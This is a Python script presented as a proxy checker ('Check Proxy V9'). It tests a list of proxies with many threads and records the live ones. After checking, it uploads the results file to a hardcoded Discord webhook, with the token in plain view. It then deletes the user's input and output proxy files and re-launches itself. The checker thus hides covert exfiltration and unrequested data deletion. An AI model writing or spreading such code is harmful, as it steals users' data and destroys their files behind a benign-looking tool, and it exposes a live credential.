import requests
from concurrent.futures import ThreadPoolExecutor
import os
import sys
import time
from time import sleep
import random
import subprocess

def clear():
    os.system("cls" if os.name == "nt" else "clear")

clear()

def check_internet_connection():
    try:
        response = requests.get("https://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

if not check_internet_connection():
    print("\n\033[1;31mNo internet connection! Exiting...")
    sys.exit(1)

def loading(seconds):
    print("\033[1;35mLoading", end="", flush=True)
    for _ in range(seconds):
        time.sleep(1)
        print("!", end="", flush=True)
    print("\n\033[1;35mDone!")
    sleep(2)

loading(5)

clear()

# Custom print function to simulate rainbow effect
def rainbow_print(text, interval=0.005):
    colors = [
        "\033[1;31m", "\033[1;33m", "\033[1;32m",
        "\033[1;34m", "\033[1;35m", "\033[1;36m"
    ]
    for char in text:
        print(f"{random.choice(colors)}{char}", end="", flush=True)
        time.sleep(interval)
    print("\033[0m")

rainbow_print(f"""
████████╗██╗ ██╗ █████╗ ███╗ ██╗██╗ ██╗ ██╗ ██╗██╗ ██╗
╚══██╔══╝██║ ██║██╔══██╗████╗ ██║██║ ██║ ██║ ██║╚██╗ ██╔╝
   ██║   ███████║███████║██╔██╗ ██║███████║ ██║ ██║ ╚████╔╝
   ██║   ██╔══██║██╔══██║██║╚██╗██║██╔══██║ ╚██╗ ██╔╝ ╚██╔╝
   ██║   ██║ ██║██║ ██║██║ ╚████║██║ ██║ ╚████╔╝ ██║
   ╚═╝   ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═╝ ╚═══╝ ╚═╝
┌───────────────────└┐ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 └┐──────────────────┐
│
│ 𝐓𝐎𝐎𝐋 𝐍𝐀𝐌𝐄: Check Proxy V9
│ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍: 9.0
│ 𝐔𝐏𝐃𝐀𝐓𝐄𝐃 𝐎𝐍 𝐃𝐀𝐓𝐄: 26/07/2025
│ 𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍: Alex
│
└──────────────────────────────────────────────────┘
""", interval=0.005)

print("\033[1;32m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
proxy_file = "Quyt.txt"
output_file = "working.txt"
webhook_url = "https://discord.com/api/webhooks/1384157631718887485/b186_uowMcKtkNhFsfZ2-UwbDoahXStbgwaWU0ZpUIE9QN8D19s99pytNcmWWIu7U2Dy"

try:
    with open(proxy_file, 'r') as file:
        proxy_list = [line.strip() for line in file if line.strip()]
except FileNotFoundError:
    print(f"\033[1;31mError: {proxy_file} not found!")
    sys.exit(1)

proxy_count = len(proxy_list)
print(f"\033[1;31mTotal Proxies: \033[1;37m{proxy_count} \033[1;31mProxies in File")
print("\033[1;34mPlease wait... \033[1;37mTool\033[1;31m is starting \033[1;37mto check \033[1;31mProxies")
print("\033[1;32m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
sleep(3)

def check_proxy(proxy):
    proxies = {
        'http': f'http://{proxy}',
        'https': f'http://{proxy}'
    }
    try:
        response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
        if response.status_code in [200, 202, 500, 502, 503, 504]:
            detect_location(proxy)
            return True
    except requests.exceptions.RequestException:
        pass
    print(f"\033[1;37m[\033[1;31m★\033[1;37m] \033[1;37m{proxy} \033[1;31m× \033[1;37mDead \033[1;31m×")
    return False

def detect_location(proxy):
    ip_address = proxy.split(':')[0]
    url = f"http://ip-api.com/json/{ip_address}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data["status"] == "success":
                print(f"\033[1;37m[\033[1;31m★\033[1;37m] \033[1;37m{proxy} \033[1;31m√ \033[1;37m{data['country']}/{data['city']} \033[1;31m√ \033[1;32mLive")
                with open(output_file, 'a') as f:
                    f.write(proxy + '\n')
            else:
                print(f"\033[1;37m[\033[1;31m+\033[1;37m] \033[1;31mFailed to detect location for {proxy}")
    except requests.exceptions.RequestException:
        print(f"\033[1;37m[\033[1;31m+\033[1;37m] \033[1;31mFailed to detect location for {proxy}")

def send_to_discord(live_count):
    try:
        with open(output_file, 'rb') as f:
            files = {'file': (output_file, f)}
            data = {'content': f'Proxy check completed. Found {live_count} live proxies.'}
            response = requests.post(webhook_url, data=data, files=files)
            if response.status_code == 204:
                print("\033[1;32mSuccessfully sent working1.txt to Discord webhook!")
            else:
                print(f"\033[1;31mFailed to send to Discord: {response.status_code}")
    except FileNotFoundError:
        print(f"\033[1;31mError: {output_file} not found!")
    except requests.exceptions.RequestException as e:
        print(f"\033[1;31mError sending to Discord: {e}")

def delete_files():
    for file in [proxy_file, output_file]:
        try:
            if os.path.exists(file):
                os.remove(file)
                print(f"\033[1;32mDeleted {file} successfully!")
        except OSError as e:
            print(f"\033[1;31mError deleting {file}: {e}")

def process_proxy(proxy):
    if check_proxy(proxy):
        pass

num_workers = 200
with ThreadPoolExecutor(max_workers=num_workers) as executor:
    executor.map(process_proxy, proxy_list)

try:
    with open(output_file, 'r') as f:
        live_count = len(f.readlines())
except FileNotFoundError:
    live_count = 0

print(f"\033[1;31mProxy check completed - saved to \033[1;37m{output_file} \033[1;31mwith \033[1;37m{live_count} \033[1;31mlive proxies")
print("\033[1;31mThank you for using the tool")

# Send to Discord webhook
send_to_discord(live_count)

# Delete input and output files
delete_files()

# Re-run the script
print("\033[1;32mRe-running ProxyV9.py...")
try:
    subprocess.run(["python3", "ProxyV9.py"], check=True)
except subprocess.CalledProcessError as e:
    print(f"\033[1;31mError re-running ProxyV9.py: {e}")
    sys.exit(1)

input("Press enter to exit")
sys.exit(0)
